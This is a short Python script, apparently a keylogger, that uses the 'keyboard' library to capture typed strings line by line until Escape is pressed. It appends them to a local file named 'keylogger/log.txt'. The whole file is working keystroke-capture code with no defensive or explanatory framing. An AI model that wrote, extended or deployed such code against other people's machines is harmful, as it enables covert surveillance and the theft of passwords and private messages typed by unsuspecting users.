import keyboard

def writting(txt):
    with open("keylogger/log.txt", "a") as file:
        file.write(txt)

#!CODE START
while not keyboard.is_pressed("escape"):
    listen = keyboard.get_typed_strings(keyboard.record(until="enter"))
    text = []
    for each in listen:
        text.append(each)
        text.append("\n")
        if each == "":
            text.pop()
            text.pop()
    text = "".join(text)
    writting(text)
#!CODE END